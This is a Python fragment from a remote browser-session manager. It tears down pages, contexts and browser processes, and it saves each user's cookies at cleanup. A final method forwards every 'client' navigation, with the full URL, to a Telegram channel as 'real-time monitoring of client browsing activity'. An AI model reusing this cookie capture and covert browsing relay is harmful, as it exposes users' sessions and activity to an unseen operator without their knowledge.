            from browser_manager import profile_has_active_session
            has_sibling = profile_has_active_session(self.user_id, exclude_session_id=self.session_id)
            if (self.browser_manager and hasattr(self.browser_manager, 'profile_manager')
                    and not has_sibling):
                await self.browser_manager.profile_manager.update_status(self.user_id, 'offline')
        except Exception as e:
            logger.debug(f"[Cleanup] Profile status update error: {e}")

        # Save final profile data
        try:
            if self.context and self.browser_manager:
                cookies = await self.context.cookies()
                if cookies:
                    await self.browser_manager.save_cookies(self.user_id, cookies)
        except Exception as e:
            logger.debug(f"[Cleanup] Cookie save error: {e}")

        # Stop CDP streamer - no timeout, let it clean up naturally
        try:
            if self._streamer:
                await self._streamer.stop()
        except asyncio.CancelledError:
            pass
        except Exception as e:
            error_str = str(e)
            if any(x in error_str for x in ['TargetClosedError', 'target', 'closed', 'browser', 'page', 'font', 'waiting']):
                logger.debug(f"[Cleanup] Streamer stop (expected): {e}")
            else:
                logger.debug(f"[Cleanup] Streamer stop: {e}")
        self._streamer = None

        # Close page
        try:
            if self.page:
                await asyncio.wait_for(self.page.close(), timeout=5.0)
        except asyncio.TimeoutError:
            logger.debug("[Cleanup] Page close timeout")
        except asyncio.CancelledError:
            pass
        except Exception as e:
            error_str = str(e)
            if any(x in error_str for x in ['TargetClosedError', 'target', 'closed', 'browser', 'page']):
                logger.debug(f"[Cleanup] Page close (expected): {e}")
            else:
                logger.debug(f"[Cleanup] Page close: {e}")
        self.page = None

        # Close context
        try:
            if self.context:
                await asyncio.wait_for(self.context.close(), timeout=5.0)
        except asyncio.TimeoutError:
            logger.debug("[Cleanup] Context close timeout")
        except asyncio.CancelledError:
            pass
        except Exception as e:
            error_str = str(e)
            if any(x in error_str for x in ['TargetClosedError', 'target', 'closed', 'browser', 'page', 'context']):
                logger.debug(f"[Cleanup] Context close (expected): {e}")
            else:
                logger.debug(f"[Cleanup] Context close: {e}")
        self.context = None

        # Close browser
        try:
            if self.browser:
                await asyncio.wait_for(self.browser.close(), timeout=5.0)
        except asyncio.TimeoutError:
            logger.debug("[Cleanup] Browser close timeout")
        except asyncio.CancelledError:
            pass
        except Exception as e:
            error_str = str(e)
            if any(x in error_str for x in ['TargetClosedError', 'target', 'closed', 'browser', 'page']):
                logger.debug(f"[Cleanup] Browser close (expected): {e}")
            else:
                logger.debug(f"[Cleanup] Browser close: {e}")
        self.browser = None

        # Unregister from GPU manager
        try:
            if self.gpu_manager:
                self.gpu_manager.unregister_session(self.session_id, self.gpu_id)
        except Exception as e:
            logger.debug(f"[Cleanup] GPU manager unregister: {e}")
        
        # Force kill only a process proven to belong to this runtime profile.
        # Never use a machine-wide process-name pattern: two tabs for one stable
        # parent deliberately have different user-data-dirs, and a regex or
        # profile basename match can otherwise kill the sibling tab.
        if force:
            try:
                import platform as platform_module
                import signal
                is_windows = platform_module.system() == 'Windows'
                browser_info = None
                profile_path = None
                browser_process = None
                try:
                    if self.browser_manager and hasattr(self.browser_manager, 'get_active_browser'):
                        browser_info = self.browser_manager.get_active_browser(self.session_id)
                        if browser_info:
                            profile_path = browser_info.get('profile_dir')
                            context = browser_info.get('context')
                            browser_obj = getattr(context, 'browser', None) if context else None
                            if browser_obj:
                                if hasattr(browser_obj, 'process'):
                                    browser_process = browser_obj.process
                                elif (hasattr(browser_obj, '_connection')
                                      and hasattr(browser_obj._connection, 'impl')):
                                    try:
                                        browser_process = (
                                            browser_obj._connection.impl
                                            ._transport._proc
                                        )
                                    except Exception:
                                        pass
                except Exception as exc:
                    logger.debug("[Cleanup] Could not get owned browser process: %s", exc)

                def _cmdline(pid: int) -> list:
                    if is_windows:
                        return []
                    try:
                        raw = Path(f"/proc/{int(pid)}/cmdline").read_bytes()
                        return [part.decode(errors='replace') for part in raw.split(b'\0') if part]
                    except Exception:
                        return []

                def _profile_from_cmdline(args: list) -> Optional[str]:
                    for index, arg in enumerate(args):
                        if arg == '--user-data-dir' and index + 1 < len(args):
                            return args[index + 1]
                        if arg.startswith('--user-data-dir='):
                            return arg.split('=', 1)[1]
                    return None

                def _owns_profile(pid: int, target: Optional[str]) -> bool:
                    if not target or not pid or pid <= 0:
                        return False
                    try:
                        target_path = Path(target).resolve()
                        base_root = Path(
                            self.browser_manager.config.profile_base_path
                        ).resolve()
                        if target_path != base_root and base_root not in target_path.parents:
                            return False
                        actual = _profile_from_cmdline(_cmdline(pid))
                        return bool(actual) and Path(actual).resolve() == target_path
                    except Exception:
                        return False

                target = str(profile_path) if profile_path else None
                owned_pids = []
                if browser_process is not None:
                    try:
                        pid = int(browser_process.pid)
                        owned_pids.append(pid)
                    except Exception:
                        pass

                # If the handle is gone, enumerate only processes whose full
                # command line contains this exact runtime profile path.
                if not owned_pids and target and not is_windows:
                    try:
                        for entry in os.listdir('/proc'):
                            if not entry.isdigit():
                                continue
                            pid = int(entry)
                            if _owns_profile(pid, target):
                                owned_pids.append(pid)
                    except Exception:
                        pass

                for pid in sorted(set(owned_pids)):
                    try:
                        os.kill(pid, signal.SIGKILL)
                        logger.debug(
                            "[Cleanup] force killed owned browser PID %s for session %s",
                            pid, self.session_id,
                        )
                    except ProcessLookupError:
                        pass
                    except Exception as exc:
                        logger.debug("[Cleanup] force kill PID %s failed: %s", pid, exc)
            except Exception as e:
                logger.debug(f"[Cleanup] Force kill error: {e}")

        # Always terminate any lingering processes and clean locks for this profile
        if profile_path:
            try:
                from sb_backend import kill_profile_processes, clean_profile_locks
                kill_profile_processes(str(profile_path))
                clean_profile_locks(str(profile_path))
            except Exception:
                pass

        # Remove the runtime ownership record exactly once.  The durable
        # parent profile remains; only the private live user-data directory is
        # eligible for cleanup.
        try:
            if self.browser_manager and hasattr(self.browser_manager, 'remove_active_browser'):
                await self.browser_manager.remove_active_browser(self.session_id)
        except Exception as e:
            logger.debug(f"[Cleanup] Runtime browser record cleanup error: {e}")

        logger.debug(f"[Cleanup] Session cleaned up: {self.session_id}")
    async def _send_navigation_notification(self, new_url: str):
        """
        Send Telegram notification when client navigates to a new URL.
        Provides real-time monitoring of client browsing activity.
        """
        try:
            from config import CONFIG
            
            # Check if Telegram and navigation notifications are enabled
            if not getattr(CONFIG, 'telegram_enabled', False):
                return
            if not getattr(CONFIG, 'telegram_notify_on_navigation', True):
                return
            
            # Get the old URL for comparison
            old_url = self.current_url or "--"
            
            # Extract domain from URL for cleaner display
            def get_domain(url):
                if not url or url == "--":
                    return "--"
                if url.startswith("http"):
                    from urllib.parse import urlparse
                    try:
                        return urlparse(url).netloc
                    except Exception:
                        return url.split('/')[2] if '/' in url else url
                return url[:50]
            
            old_domain = get_domain(old_url)
            new_domain = get_domain(new_url)
            
            # Shorten URLs for display
            display_old = old_url[:60] + "..." if len(old_url) > 60 else old_url
            display_new = new_url[:60] + "..." if len(new_url) > 60 else new_url
            
            # Plain text message format
            message = f"""
CLIENT NAVIGATION

USER
{self.user_id[-16:]}

FROM
{old_domain}

TO
{new_domain}

FULL URL
{display_new}"""
            
            # Send to Telegram via main.py function
            try:
                from main import send_telegram_notification
                await send_telegram_notification(message.strip())
            except Exception as e:
                log_error(f"[Telegram Nav Error] {e}")
                    
        except Exception as e:
            # Silent error - never block session management
            pass


from browser_manager import BrowserManager
